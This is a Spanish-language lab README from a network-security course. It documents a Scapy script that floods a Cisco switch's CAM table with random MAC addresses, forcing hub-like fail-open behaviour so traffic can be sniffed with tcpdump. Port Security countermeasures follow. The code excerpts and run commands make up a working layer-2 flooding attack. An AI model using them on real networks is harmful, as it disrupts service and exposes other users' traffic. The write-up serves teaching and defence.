# Ataque MAC Flooding
### Jordy Rosario · Matrícula: 20250737
**Seguridad de Redes 2026-C-2 · ITLA**

---

## 📋 Tabla de Contenido

1. [Objetivo del Laboratorio](#1-objetivo-del-laboratorio)
2. [Objetivo del Script](#2-objetivo-del-script)
   - [Parámetros de Uso](#21-parámetros-de-uso)
   - [Requisitos del Sistema](#22-requisitos-del-sistema)
3. [Funcionamiento del Script](#3-funcionamiento-del-script)
4. [Documentación de la Red](#4-documentación-de-la-red)
   - [Topología](#41-topología)
   - [Tabla de Dispositivos y Direccionamiento IP](#42-tabla-de-dispositivos-y-direccionamiento-ip)
5. [Ejecución del Ataque](#5-ejecución-del-ataque)
6. [Capturas de Pantalla](#6-capturas-de-pantalla)
7. [Contramedidas y Mitigación](#7-contramedidas-y-mitigación)
8. [Video Demostrativo](#8-video-demostrativo)
9. [Referencias](#9-referencias)

---

## 1. Objetivo del Laboratorio

El objetivo de este laboratorio es **demostrar las vulnerabilidades de la tabla CAM (Content Addressable Memory) de los switches Cisco** frente a la inundación masiva de tramas con MACs de origen falsas y aleatorias.

Se busca evidenciar específicamente:

- Cómo un atacante puede desbordar la tabla CAM de un switch llenándola con entradas MAC falsas.
- Cómo al agotarse la tabla CAM, el switch entra en modo **fail-open** y comienza a reenviar todas las tramas por todos sus puertos (comportamiento de hub).
- Cómo este comportamiento expone el tráfico unicast de todos los hosts de la VLAN al atacante.
- La efectividad de **Port Security** como contramedida en switches Cisco.

Este laboratorio se realiza en un entorno controlado con fines **exclusivamente educativos** dentro del curso de Seguridad de Redes del ITLA.

---

## 2. Objetivo del Script

El script [JordyRosario_20250737_MAC_Flooding.py](JordyRosario_20250737_MAC_Flooding.py) genera e inyecta de forma continua tramas Ethernet con **direcciones MAC de origen y destino completamente aleatorias**, forzando al switch a registrar una nueva entrada en su tabla CAM por cada trama recibida hasta agotarla.

El script admite dos modos de operación:
- **Modo continuo:** envía paquetes indefinidamente hasta que el usuario presiona `Ctrl+C`.
- **Modo limitado:** envía una cantidad específica de paquetes y se detiene automáticamente.

### 2.1 Parámetros de Uso

```bash
sudo python3 JordyRosario_20250737_MAC_Flooding.py <interfaz> [cantidad]
```

| Parámetro | Descripción | Requerido | Ejemplo |
|-----------|-------------|-----------|---------|
| `interfaz` | Interfaz de red desde donde se inundan las tramas | Sí | `eth0` |
| `cantidad` | Número de paquetes a enviar. `0` o sin especificar = modo continuo | No | `10000` |

**Ejemplos de uso:**
```bash
# Modo continuo — inundación hasta Ctrl+C
sudo python3 JordyRosario_20250737_MAC_Flooding.py eth0

# Modo limitado — enviar exactamente 10000 paquetes
sudo python3 JordyRosario_20250737_MAC_Flooding.py eth0 10000
```

### 2.2 Requisitos del Sistema

| Requisito | Detalle |
|-----------|---------|
| **Sistema Operativo** | Kali Linux (virtualizado en QEMU/PNETLab) |
| **Lenguaje** | Python 3 |
| **Dependencia principal** | `scapy` |
| **Privilegios** | `sudo` / `root` obligatorio (raw sockets en Capa 2) |
| **Interfaz de red** | Conectada al mismo segmento L2 que el switch objetivo |

**Instalación de dependencias:**
```bash
pip install scapy
```

---

## 3. Funcionamiento del Script

A continuación se explica el script **bloque por bloque**:

### Bloque 1: Importación de Módulos

```python
import sys, time, signal
from scapy.all import Ether, IP, sendp, RandMAC, RandIP
```

- `signal`: permite capturar `Ctrl+C` para mostrar el resumen final antes de salir.
- `RandMAC()`: genera una dirección MAC aleatoria de 6 bytes en cada llamada.
- `RandIP()`: genera una dirección IP aleatoria — se usa para dar cuerpo al paquete aunque el ataque opera en Capa 2.
- `sendp`: envía paquetes directamente en Capa 2 sin pasar por la pila TCP/IP del sistema operativo.

---

### Bloque 2: Manejador de Salida Limpia

```python
def salida_limpia(sig, frame):
    print(f"\n[+] Ataque detenido.")
    print(f"[+] Total de paquetes enviados: {paquetes_enviados}")
    sys.exit(0)
```

- Captura la señal `SIGINT` (Ctrl+C) para mostrar el contador total de paquetes enviados antes de terminar.

---

### Bloque 3: Construcción del Paquete

```python
pkt = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP())
```

- `Ether(src=RandMAC())`: cada trama tiene una MAC de **origen diferente** — esta es la clave del ataque. El switch registra cada MAC origen nueva en su tabla CAM asociada al puerto del atacante.
- `Ether(dst=RandMAC())`: la MAC de destino también es aleatoria — el switch no la encontrará en su tabla y hará flooding de la trama, pero lo importante es el registro de la MAC origen.
- `IP(src=RandIP(), dst=RandIP())`: capa IP con IPs aleatorias que dan peso al paquete. No es obligatoria para el ataque pero hace las tramas más realistas.

---

### Bloque 4: Bucle de Inyección con Modo Dual

```python
while True:
    sendp(pkt, iface=interfaz, verbose=False)
    paquetes_enviados += 1
    print(f"\r[>] Paquetes enviados: {paquetes_enviados}", end="", flush=True)
    if cantidad > 0 and paquetes_enviados >= cantidad:
        print(f"\n[+] Se enviaron {paquetes_enviados} paquetes.")
        sys.exit(0)
```

- Sin delay entre envíos — maximiza la velocidad de llenado de la tabla CAM.
- Si `cantidad > 0`, el bucle se detiene automáticamente al alcanzar el límite.
- Si `cantidad == 0`, el bucle es infinito hasta `Ctrl+C`.
- `verbose=False`: suprime la salida de Scapy para no ralentizar el envío.

---

## 4. Documentación de la Red

### 4.1 Topología

```
                    ┌─────────────┐
                    │     R1      │ ← Router / Gateway
                    │ e0/0        │   IP: 20.25.37.1
                    └──────┬──────┘
                           │ e0/0
                    ┌──────┴──────┐
                    │    SW1      │ ← Switch Core / Distribución
                    │             │   (Trunk 802.1Q)
                    └──────┬──────┘
                           │ e0/1 → e0/0
                    ┌──────┴──────┐
          ┌─────────┤    SW2      ├─────────┐
          │ e0/3    │             │ e0/1    │ e0/2
          │         └─────────────┘         │
   ┌──────┴──────┐                   ┌──────┴──────┐  ┌─────────────┐
   │ Kali Linux  │                   │   Docker    │  │    VPC      │
   │  (atacante) │                   │  (víctima)  │  │  (víctima)  │
   │20.25.37.100 │                   │ 20.25.37.50 │  │             │
   └──────┬──────┘                   └─────────────┘  └─────────────┘
          │ e1
   ┌──────┴──────┐
   │     Net     │ ← Red externa (conexión SSH)
   └─────────────┘
```

> Ver imagen de topología: `screenshots/topologia.png`

### 4.2 Tabla de Dispositivos y Direccionamiento IP

El esquema de red utiliza la subred `20.25.37.0/24` derivada de la matrícula `20250737`.

| Dispositivo | Tipo | Interfaz | IP | VLAN | Rol |
|-------------|------|----------|----|------|-----|
| **R1** | Router IOL | e0/0 | 20.25.37.1/24 | VLAN 10 | Default Gateway |
| **SW1** | Switch IOL | e0/0, e0/1 | N/A | Trunk 802.1Q | Switch Core / Distribución |
| **SW2** | Switch IOL | e0/0–e0/3 | N/A | e0/0 Trunk; e0/1–e0/3 Access VLAN 10 | Switch de Acceso (objetivo) |
| **Kali Linux** | VM QEMU | eth0 (SW2 e0/3), e1 | 20.25.37.100/24 | VLAN 10 (Access) | Nodo Atacante |
| **Docker** | Contenedor | eth1 | 20.25.37.50/24 | VLAN 10 | Cliente Víctima A |
| **VPC** | VPC | eth0 | DHCP .0/24 | VLAN 10 | Cliente Víctima B |

---

## 5. Ejecución del Ataque

### Paso 1: Preparar el entorno

```bash
pip install scapy
git clone https://github.com/Jordy513/P6_MAC_Flooding_20250737.git
cd P6_MAC_Flooding_20250737
```

### Paso 2: Verificar la tabla CAM antes del ataque

En SW2:
```cisco
SW2# show mac address-table count
```
Anota la cantidad de entradas actuales y el límite máximo.

### Paso 3: Lanzar el ataque

```bash
# Modo continuo
sudo python3 JordyRosario_20250737_MAC_Flooding.py eth0

# O modo limitado para una demo controlada
sudo python3 JordyRosario_20250737_MAC_Flooding.py eth0 5000
```

### Paso 4: Verificar el desbordamiento en SW2

```cisco
SW2# show mac address-table count
SW2# show mac address-table dynamic
```

Verás miles de entradas MAC falsas asociadas al puerto `Et0/3` (Kali).

### Paso 5: Verificar el comportamiento fail-open

En Kali, abrir otra terminal y capturar con tcpdump:
```bash
sudo tcpdump -i eth0 -n
```

Verás tráfico unicast entre otros hosts (Docker ↔ R1) llegando a la interfaz de Kali — el switch ahora se comporta como hub.

### Paso 6: Detener el ataque

```
Ctrl+C
```

---

## 6. Capturas de Pantalla

| # | Archivo | Descripción |
|---|---------|-------------|
| 1 | [01_topologia.png](screenshots/01_topologia.png) | Topología en PNETLab con nombre y matrícula visibles |
| 2 | [02_cam_antes.png](screenshots/02_cam_antes.png) | `show mac address-table count` en SW2 antes del ataque |
| 3 | [03_ataque_ejecutandose.png](screenshots/03_ataque_ejecutandose.png) | Script corriendo — contador de paquetes en tiempo real |
| 4 | [04_cam_desbordada.png](screenshots/04_cam_desbordada.png) | SW2 con la tabla CAM llena de MACs falsas |
| 5 | [05_trafico_expuesto.png](screenshots/05_trafico_expuesto.png) | `tcpdump` en Kali mostrando tráfico unicast de otros hosts |
| 6 | [06_contramedida_aplicada.png](screenshots/06_contramedida_aplicada.png) | Port Security configurado en SW2 |
| 7 | [07_post_mitigacion.png](screenshots/07_post_mitigacion.png) | Puerto en `err-disabled` tras detectar el flooding |

> *Las capturas se encuentran en la carpeta [screenshots](screenshots/README.md) de este repositorio.*

---

## 7. Contramedidas y Mitigación

La defensa principal contra MAC Flooding es **Port Security**, que limita la cantidad de MACs que puede aprender un puerto del switch.

### Contramedida 1: Port Security — Límite de MACs (Recomendado)

```cisco
SW2# configure terminal
SW2(config)# interface ethernet 0/3
SW2(config-if)# switchport mode access
SW2(config-if)# switchport port-security
SW2(config-if)# switchport port-security maximum 5
SW2(config-if)# switchport port-security violation shutdown
SW2(config-if)# switchport port-security aging time 2
SW2(config-if)# end
SW2# write memory
```

> **Efecto:** En cuanto el script supera las 5 MACs aprendidas en el puerto, el switch lo pone en estado `err-disabled` automáticamente, deteniendo el ataque por completo.

### Contramedida 2: Aplicar en todos los puertos de acceso

```cisco
SW2(config)# interface range ethernet 0/1 - 3
SW2(config-if-range)# switchport mode access
SW2(config-if-range)# switchport port-security
SW2(config-if-range)# switchport port-security maximum 5
SW2(config-if-range)# switchport port-security violation shutdown
SW2(config-if-range)# end
SW2# write memory
```

### Contramedida 3: Recuperar puerto err-disabled

```cisco
SW2# configure terminal
SW2(config)# interface ethernet 0/3
SW2(config-if)# shutdown
SW2(config-if)# no shutdown
SW2(config-if)# end
```

### Resumen de contramedidas

| Contramedida | Comando | Alcance | Efecto |
|---|---|---|---|
| Port Security (máx. MACs) | `switchport port-security maximum 5` | Por puerto | Limita MACs aprendidas por puerto |
| Violación shutdown | `switchport port-security violation shutdown` | Por puerto | Puerto a `err-disabled` al superar el límite |
| Aging time | `switchport port-security aging time 2` | Por puerto | Elimina MACs inactivas cada 2 minutos |
| Port Security en rango | `interface range ethernet 0/1 - 3` | Múltiples puertos | Protección masiva en un solo bloque |

---

## 8. Video Demostrativo

🎥 **[Ver demostración en YouTube](https://youtu.be/bjIqSAW_SqA)**

**Duración:** 3:06

**Contenido del video:**
- ✅ Topología visible con nombre y matrícula
- ✅ Hora y fecha del sistema visible
- ✅ Cara y voz del autor
- ✅ Tabla CAM antes del ataque
- ✅ Script inundando la tabla CAM con MACs falsas
- ✅ SW2 con tabla CAM desbordada
- ✅ Tráfico unicast de otros hosts visible en `tcpdump` (fail-open)
- ✅ Aplicación de Port Security
- ✅ Puerto en `err-disabled` tras el flooding

---

## 9. Referencias

- Cisco Systems. (2023). *Port Security Configuration Guide*.
- Cisco Systems. (2023). *Understanding and Configuring the MAC Address Table*.
- Biondi, P. et al. (2024). *Scapy Documentation*. https://scapy.readthedocs.io/en/latest/
- IEEE. (2018). *IEEE 802.1Q — Bridges and Bridged Networks*.
- ITLA. (2026). *Seguridad de Redes — Material de Curso 2026-C-2*.
- Troubleshooting y documentación apoyado en Inteligencia Artificial.
